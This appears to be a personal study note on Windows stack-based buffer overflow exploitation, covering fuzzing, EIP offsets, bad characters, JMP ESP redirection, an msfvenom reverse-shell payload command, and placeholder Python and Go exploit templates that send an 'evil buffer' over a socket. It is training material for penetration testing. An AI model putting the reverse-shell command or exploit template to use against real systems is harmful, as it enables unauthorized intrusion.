# Stackbased Buffer Overflows

## General Approach
Incremental stepping through your exploitation PoC on non-target enivornment to test **EACH** step to 

## Finding the vulnerability
1. Source code review
	1. Find vulnerable functions
2. [Fuzzing](https://en.wikipedia.org/wiki/Fuzzing)
	1.  Fuzz any input fields
3. Reverse Engineering
	1. Find vulnerable functions

Before getting excited consider if the target machine is protected with [[Binary-Exploitation-Protections]]

## Fuzzing HTTP protocol
[Microsoft TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview) if debugger network listening does not work.

1. Use [[Wireshark]] to monitor traffic sent to application and follow TCP stream to show reply. 
2. [[Useful_Python]] PoC 
3. Run debugger Administrative priveleges attached to running of the vulnerable application
	1. Or for Windows [tcpview if immunity debugger listen column unavaliable](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview)
	2. Attach process with immunity debugger

## Buffer Overflow Exploitation
Be aware alot of restarting required.

Note the  Endianess 

1. Enumerate till location EIP
	1. Binary Tree analysis - use pwntools `cyclic` or `msf-pattern_create -l $int`
	2. Update PoC
1. Check offset(skip binary tree analysis) with `msfpattern_offset -l $int -q $offsetpattern` or pwntools `offset`. From EIP the offset is located at relative memory address higher than EIP - closer to 0x0!.
	1. Add EIP variable to find exact EIP address.
1. Locating space for shellcode
1. Check for bad characters
1. Redirect the execution to flow: - Remember Endianness
	
Due address changing either due crashing-and-restarting application or ASLR ... we can just hardcode a static return address in general in modern binary exploitation.

6. Find a return address
7. Leverage a static address that contains a `JMP ESP`("jumps" to addresws pointed to by ESP) - we redirect EIP to this adderss
	1. Must be static - no libraries compiled with ASLR support
	2. Not an address within the region to be occupied by the shellcode
8. Encoded payloads from [[MSFvenom-Payloads]] are prepended with a decoder stub to decode itself using memory. GetPC routine assmebly instruction to gather memory location of the decoder stub.
	1. shikata_ga_nai write to top of the stack potentially corrupting the address pointed at by the ESP register meaning that the GetPC route execution changes the decoder itself.
	
To avoid this final issue you could:
1. Adjust ESP backward using assemble instructions _DEC ESP_, _SUB ESP, 0xXX_, before executing the decoder
2. Create large area for JMP ESP and NOP sled


## Considerations

1. One consideration depending on the application and the type of vulnerability, there may be restrictions on the length of input passed to the application. In some cases, increasing the length of a buffer may result in a completely different crash. This is due the larger buffer overwrites additional data on the stack that is used by the target application, but could provide extra space for shellcode.

2. Bad characters `-b` flag for [[MSFvenom-Payloads]] followed by a string of hex delimited with `\x`

3. Another being **ExitThread** API with [[MSFvenom-Payloads]] - `EXITFUNC=thread`:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10. LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
This avoid crashing the application when you terminate the shell.

4. Staging payload, if you do not have enough space create `stage` that would be equal to a set of opcodes to point to another address, you may require repadding the original buffer with `\x90`s to maintain the correct length.

5. To create the correct opcodes for assembly instructions, use `msf-nasm_shell` from [[Metasploit]].

6. `-v` variable to save as a variable name `-f py` format flag plus the py for python will format it to python variable.

7. Debugger will catch the child process of spawn the shell, remember not to have the debugger attached.

## Tooling
[[Pwntools]], see [[Reverse-Engineering-Tools]]




## APPENDIX:

\\xCC as a graceful break for binex than crashing.

// ENDIANNESS tester
```c
#include <stdio.h>
union s{
	int n;
	char b;
}x;
void main(){
	x.n = 0x4142;
	if(x.b == 0x42){
		printf("Little Endian\n");
	}
	else{
		printf("Big Endian\n");
	}
}
```

#### Templates 

```go
bof := strings.Builder{}
shell := ` `

offset := 608
rip := '0x' //store it to not overflow your own memory
formatRIP := //nice formatting hex function
nopSled := `\x90` 
safeJunk := `\xCC`
* someamount
payloadSize := offset + 8
shellSize := len(shell)
nopSize := len(nopSled)
padding := 'A' * (payloadSize - shellSize - nopSize)

bof.WriteString(nopSled, shell, padding, formatRIP)

payload := bof.String()

fmt.Printf("%s", payload)
```

```python
#!/usr/bin/python
import socket

host = "<ip_address>"
port = <port_number_as_int>

nop_sled = "\x90" * <nop_sled_size>

# stick the msfvenom payload command here for reference
shellcode = ""
... # Shellcode goes here


padding = "\x41" * (<padding_size_as_int> - len(nop_sled) - len(shellcode))

eip = "<eip_hex_address>" # remember endianness
stager = "<insert_opcodes_here>" # msf-nasm_shell to create opcode

buffer = f"<useful_string_if_required >{padding}{eip}{stager}\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")

s.connect((host, port))
print(f"{s.recv(1024)}")

s.send(buffer)
s.close()

print("[*] Payload Sent !")
```